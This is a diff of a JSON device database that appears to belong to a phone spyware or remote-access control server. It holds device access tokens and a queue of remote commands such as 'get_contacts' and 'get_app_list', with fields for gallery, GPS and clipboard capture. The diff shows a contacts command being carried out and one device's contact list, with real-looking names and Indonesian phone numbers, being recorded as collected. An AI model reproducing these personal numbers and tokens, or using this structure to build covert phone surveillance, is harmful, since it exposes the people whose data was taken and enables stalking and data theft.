@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777181616887,
+    "lastSeen": 1777181645808,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -4037,13 +4037,8 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777179258117,
+    "lastSeen": 1777181645708,
     "commandQueue": [
-      {
-        "type": "get_contacts",
-        "payload": {},
-        "sentAt": 1777179292106
-      },
       {
         "type": "get_app_list",
         "payload": {},
@@ -4974,7 +4969,60 @@
       }
     ],
     "galleryDone": false,
-    "contacts": [],
+    "contacts": [
+      {
+        "name": "Bunda Chika",
+        "phone": "0895-6026-89312"
+      },
+      {
+        "name": "Bunda Chika",
+        "phone": "0895602689312"
+      },
+      {
+        "name": "Cek Bonus",
+        "phone": "*889#"
+      },
+      {
+        "name": "Cek Nomor",
+        "phone": "*808#"
+      },
+      {
+        "name": "Cek Pulsa",
+        "phone": "*888#"
+      },
+      {
+        "name": "Contact Center",
+        "phone": "188"
+      },
+      {
+        "name": "Data Transaksi",
+        "phone": "*887#"
+      },
+      {
+        "name": "Info Pelanggan",
+        "phone": "188"
+      },
+      {
+        "name": "Isi Pulsa",
+        "phone": "888"
+      },
+      {
+        "name": "Kak Aliya",
+        "phone": "+6282213258648"
+      },
+      {
+        "name": "Mas Qoris",
+        "phone": "+6289672826065"
+      },
+      {
+        "name": "NSP1212",
+        "phone": "1212"
+      },
+      {
+        "name": "TELKOMSEL",
+        "phone": "+62111"
+      }
+    ],
     "lastGps": null,
     "gpsList": [],
     "lastClipboard": null,
